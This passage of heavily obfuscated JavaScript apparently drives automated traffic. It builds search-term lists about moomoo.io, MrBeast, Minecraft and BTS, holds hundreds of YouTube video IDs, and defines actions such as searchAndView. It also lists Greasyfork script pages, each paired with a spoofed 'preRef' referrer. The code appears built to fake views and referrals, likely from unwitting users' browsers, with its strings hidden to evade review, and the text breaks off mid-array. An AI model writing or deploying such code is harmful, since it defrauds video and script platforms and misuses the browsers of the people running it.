searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + a0(0xb) + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + a0(0xf) + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + a0(0x12) + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x6ad + 0x1295 * 0x1 + -0xbde)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x11 * 0x7b + -0x839 + 0x106e)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1dd2 + 0x1 * -0x22f + -0x1ba0);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    Z(0xd, '1X[t') + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    Z(0x11, 'H$n3') + 'w',
    Z(0x4, 'Pjkn') + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    Z(0x17, 'jA6w') + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Z(0x7, 'tZrv') + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + Z(0xc, 'ZKJr') + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + Z(0x0, 'Fn6H') + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + a0(0x13) + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
